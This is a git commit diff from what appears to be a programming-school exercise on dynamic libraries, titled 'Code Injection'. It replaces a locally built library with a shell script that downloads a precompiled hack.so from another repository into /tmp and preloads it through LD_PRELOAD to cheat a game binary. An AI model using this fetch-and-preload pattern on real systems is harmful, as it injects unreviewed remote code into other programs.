704bcd8bc50df3e2194f6b193bbade224aa3d2ac
BELLO ABAYOMI <101479751+BluvD143@users.noreply.github.com>
2022-07-12 23:31:18 +0100

    Task 3 - Code Injection

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-gcc -Wall -fPIC -shared -o libc.so libc.c
-LD_PRELOAD=$PWD/libc.so ./gm
+wget -q -P /tmp https://github.com/adrienmillot/holbertonschool-low_level_programming/raw/main/0x18-dynamic_libraries/hack.so
+export LD_PRELOAD=/tmp/hack.so
